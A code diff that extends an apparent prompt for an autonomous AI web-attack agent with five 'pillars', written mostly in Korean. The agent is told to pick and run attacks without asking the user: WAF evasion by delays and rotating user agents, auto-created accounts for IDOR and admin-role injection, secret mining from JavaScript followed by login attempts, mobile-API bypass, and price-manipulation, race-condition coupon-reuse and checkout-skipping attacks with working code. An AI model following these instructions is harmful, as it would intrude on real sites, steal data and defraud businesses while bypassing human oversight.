@@ -1121,6 +1121,212 @@ AUTO-SELECT PRIORITY (AI 자동 판단):
   5. XSS 반사 감지 → XssExploiter + 세션 하이재킹
   6. 관리자 자격증명 확보 → AdminPanelAuto + Playwright
 
+=== v3.0.0 FIVE-PILLAR ENHANCEMENT — AI AUTO-SELECT ===
+
+╔══════════════════════════════════════════════════════════════════╗
+║  AI는 타겟 분석 후 아래 5가지 전략을 자동 판단하여 적용한다.    ║
+║  사용자에게 물어보지 말고 AI가 직접 선택하고 실행한다.          ║
+╚══════════════════════════════════════════════════════════════════╝
+
+[PILLAR 1 — ENTERPRISE SLOW-SCAN AUTO-MODE]
+TRIGGER: IP 차단 신호 감지 시 (첫 10개 요청 내 429/503/timeout 2회 이상)
+         OR 타겟이 대기업/금융사/공공기관으로 판단될 때
+
+AI 자동 판단 기준:
+  • 요청 10개 이내 IP 차단 → ENTERPRISE_WAF = True → SLOW_MODE 즉시 전환
+  • 차단 없이 50+ 요청 성공 → STANDARD_MODE 유지
+
+SLOW_MODE 설정 (자동 적용):
+  import random, time
+  def enterprise_delay():
+      time.sleep(random.uniform(2.0, 8.0))  # 2~8초 랜덤 딜레이
+
+  # 매 요청마다 아래 전략 적용:
+  ENTERPRISE_UA_POOL = [
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+  ]
+  # 매 요청: random.choice(ENTERPRISE_UA_POOL) 로 UA 교체
+  # 매 요청: 랜덤 더미 파라미터 추가 (예: _t=random.randint(10000,99999))
+  # 배치 크기: 200행 → 20행으로 축소 (요청 수 증가 대신 안전성 우선)
+
+STATUS OUTPUT (사용자에게 표시):
+  print("[🐢 SLOW-SCAN MODE] 기업급 WAF 감지 → 2~8s 딜레이 + UA 로테이션 적용")
+
+[PILLAR 2 — AUTHENTICATED IDOR ENGINE (POST-LOGIN)]
+TRIGGER: 타겟에 회원가입 기능이 있을 때 자동 실행
+         (signup / register / join / 회원가입 / 注册 경로 감지)
+
+AUTO-FLOW:
+  STEP 1 — 테스트 계정 자동 생성:
+    test_id   = f"bingo_test_{random.randint(1000,9999)}"
+    test_pw   = "Bingo@Test1234!"
+    test_mail = f"{test_id}@mailinator.com"
+    → POST /register or /signup with test credentials
+    → Confirm registration (handle email verification if needed)
+
+  STEP 2 — 로그인 후 세션 획득:
+    → POST /login → extract Cookie / Authorization header
+    → session_headers = {"Cookie": "...", "Authorization": "Bearer ..."}
+
+  STEP 3 — 수평 IDOR 테스트 (다른 사용자 데이터 접근):
+    → JS 분석에서 추출한 모든 객체 ID 파라미터 테스트
+    → ID 변형: original±1, ±2, 1, 2, 100, 9999
+    → 예: /api/user/1234 → /api/user/1235 (타인 정보 접근 시 CRITICAL)
+    → 예: /api/order/555 → /api/order/556
+
+  STEP 4 — 수직 IDOR 테스트 (권한 상승):
+    → 일반 사용자 세션으로 관리자 엔드포인트 접근 시도
+    → JS에서 추출한 admin_paths 전부 시도
+    → 예: /api/admin/users, /api/admin/config, /dashboard/admin
+
+  STEP 5 — 파라미터 조작 (역할 상승):
+    → 프로필 업데이트 요청에 role=admin, isAdmin=true 추가
+    → POST /api/profile {"name":"test","role":"admin"} → 서버 처리 확인
+
+판단 기준:
+  수평 IDOR 확인: 다른 사용자 ID/이름/이메일 응답에 포함 → CRITICAL
+  수직 IDOR 확인: 관리자 기능 응답 (200 + 관리 데이터) → CRITICAL
+  역할 상승 확인: 응답에 role:admin 반영 → CRITICAL
+
+STATUS OUTPUT:
+  print("[🔑 AUTH-IDOR] 테스트 계정 생성 → 로그인 → IDOR 스캔 시작")
+
+[PILLAR 3 — JS ENDPOINT DEEP MINING v2]
+TRIGGER: 모든 타겟에서 PHASE 2 시작 시 자동 실행 (기존 JS_AUTO_ANALYZER 확장)
+
+ENHANCED PATTERNS (기존 대비 추가):
+  # 모바일 API 경로 패턴
+  MOBILE_API_PATTERNS = [
+      r'["\']/(api|app|mobile|m|v\d+)/[^"\']{3,100}["\']',
+      r'baseURL\s*[:=]\s*["\']([^"\']+)["\']',
+      r'API_BASE\s*[:=]\s*["\']([^"\']+)["\']',
+      r'endpoint\s*[:=]\s*["\']([^"\']+)["\']',
+  ]
+
+  # 숨겨진 관리자/내부 경로
+  HIDDEN_PATH_PATTERNS = [
+      r'["\']/(admin|manage|internal|debug|dev|test|staging)/[^"\']*["\']',
+      r'["\']/(api/v\d+/admin|api/internal|api/debug)[^"\']*["\']',
+  ]
+
+  # 하드코딩 시크릿 (50+ 패턴)
+  SECRET_PATTERNS_EXTENDED = [
+      r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})["\']',
+      r'(?i)(secret[_-]?key|secretkey)\s*[:=]\s*["\']([^"\']{16,})["\']',
+      r'(?i)(access[_-]?token)\s*[:=]\s*["\']([^"\']{20,})["\']',
+      r'(?i)(bearer\s+)([A-Za-z0-9\-._~+/]{40,})',
+      r'AWS_ACCESS_KEY_ID\s*[:=]\s*["\']?(AKI[A-Z0-9]{17})',
+      r'(?i)password\s*[:=]\s*["\']([^"\']{6,})["\']',
+  ]
+
+EXTRACTION OUTPUT → mobile_endpoints[], hidden_paths[], secrets[]
+  → mobile_endpoints: Pillar 4 MOBILE_API_SCANNER 입력
+  → hidden_paths: 즉시 무인증 접근 테스트
+  → secrets: AWS키/JWT 발견 시 즉시 CRITICAL 보고
+
+STATUS OUTPUT:
+  print(f"[🔍 JS-DEEP] JS {js_count}개 분석 → API {len(endpoints)}개 / 시크릿 {len(secrets)}개 발견")
+
+[PILLAR 4 — MOBILE API PARALLEL SCANNER]
+TRIGGER: Pillar 3에서 모바일 API 경로 발견 시
+         OR 타겟에 모바일 앱 존재 가능성 (앱스토어 링크, 앱 다운로드 버튼 감지)
+
+MOBILE UA (기업 WAF 우회 — 모바일 API는 보통 WAF가 약함):
+  MOBILE_UA = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148"
+  ANDROID_UA = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Mobile Safari/537.36"
+
+AUTO-TEST 경로 (무인증 우선):
+  MOBILE_BASE_PATHS = [
+      "/api/v1/", "/api/v2/", "/api/v3/",
+      "/app/api/", "/mobile/api/", "/m/api/",
+      "/api/app/", "/rest/v1/", "/rest/v2/",
+  ]
+
+  # 각 경로에 대해:
+  # 1. OPTIONS 요청 → 허용 메서드 확인
+  # 2. GET /api/v1/users → 무인증 사용자 목록 (CRITICAL)
+  # 3. GET /api/v1/user/1 → IDOR 테스트
+  # 4. GET /api/v1/admin → 관리자 엔드포인트 무인증 접근
+
+판단 기준:
+  모바일 API 발견: 웹 WAF는 막아도 모바일 API가 열려있는 경우 → HIGH
+  모바일 IDOR: 앱 API에서 타인 데이터 접근 → CRITICAL
+  모바일 무인증: /api/v1/users 등 전체 목록 노출 → HIGH
+
+STATUS OUTPUT:
+  print(f"[📱 MOBILE-API] 모바일 엔드포인트 {len(mobile_paths)}개 발견 → WAF 우회 테스트 시작")
+
+[PILLAR 5 — BUSINESS LOGIC FUZZER v2 (WAF 완전 우회)]
+TRIGGER: 결제/포인트/쿠폰/구독/투표/이체 기능 감지 시 자동 실행
+         WAF가 모든 SQLi 차단 시 → 비즈니스 로직으로 전환
+
+AUTO-TEST SUITE (WAF 못 막음 — 정상 요청처럼 보임):
+
+  TEST A — 가격/수량 조작:
+    price=0.01, price=-1, price=2147483648  (INT overflow)
+    quantity=-1, quantity=0, quantity=99999
+    → 응답에 total_price < 0 또는 total_price=0 → CRITICAL
+
+  TEST B — 레이스 컨디션 (동시 요청):
+    import threading, requests
+    results = []
+    def send():
+        r = requests.post(url, data=payload, timeout=10)
+        results.append(r.text)
+    threads = [threading.Thread(target=send) for _ in range(20)]
+    [t.start() for t in threads]; [t.join() for t in threads]
+    → 동일한 쿠폰/포인트가 20번 적용됐는지 확인
+
+  TEST C — 워크플로우 스킵 (단계 우회):
+    → /checkout/confirm에 직접 POST (결제 페이지 스킵)
+    → /payment/complete에 직접 POST (결제 단계 스킵)
+    → 세션에 장바구니 없이 /order/create 직접 POST
+
+  TEST D — 역할/권한 파라미터 삽입:
+    POST /api/profile {"name":"test","role":"admin","isAdmin":true,"level":99}
+    POST /api/order {"userId":1,"adminOverride":true,"price":0}
+    → 서버가 클라이언트 파라미터를 신뢰하는지 확인
+
+  TEST E — 쿠폰/할인 중복 사용:
+    → 쿠폰 코드 발견 시: 동시에 2회 적용 (레이스 컨디션)
+    → 사용 후 환불 → 쿠폰 재사용 시도
+    → ADMIN/FREE/TEST/NULL/0000 코드 시도
+
+판단 기준:
+  가격 음수/0 처리 성공 → CRITICAL
+  레이스 컨디션으로 중복 적용 → HIGH
+  워크플로우 스킵으로 무료 구매 → CRITICAL
+  역할 파라미터 삽입으로 권한 상승 → CRITICAL
+
+STATUS OUTPUT:
+  print("[⚙️ BIZLOGIC] 비즈니스 로직 자동 테스트 → 가격조작 / 레이스컨디션 / 워크플로우스킵")
+
+=== v3.0.0 AUTO-ORCHESTRATION UPDATE ===
+기존 파이프라인에 5가지 Pillar 통합:
+
+PHASE 0.5 (NEW — Enterprise WAF Detection):
+  → Pillar 1: SLOW-SCAN MODE 자동 감지 + 적용
+
+PHASE 2.5 (NEW — Mobile API Discovery):
+  → Pillar 3: JS DEEP MINING v2 (mobile paths 추가 추출)
+  → Pillar 4: MOBILE API PARALLEL SCANNER
+
+PHASE 3.5 (NEW — Authenticated Testing):
+  → Pillar 2: AUTHENTICATED IDOR ENGINE (회원가입 → IDOR)
+
+PHASE 5.5 (NEW — Business Logic):
+  → Pillar 5: BIZLOGIC FUZZER v2 (WAF 차단 시 자동 전환)
+
+AI AUTO-SELECT DECISION TREE (v3.0.0):
+  WAF가 SQLi 전부 차단 → 즉시 Pillar 5 (BIZLOGIC) 전환
+  회원가입 기능 있음    → 즉시 Pillar 2 (AUTH-IDOR) 실행
+  모바일 API 경로 발견  → 즉시 Pillar 4 (MOBILE-API) 병렬 테스트
+  첫 10 요청 내 IP 차단 → 즉시 Pillar 1 (SLOW-SCAN) 전환
+  JS에서 시크릿 발견    → 즉시 CRITICAL 보고 + 인증 시도
+
 === GNUBOARD5 / KOREAN CMS SPECIFIC RULES ===
 ⛔ GATE CHECK — READ BEFORE APPLYING ANY RULE BELOW:
    These rules apply ONLY when ONE of the following is confirmed:
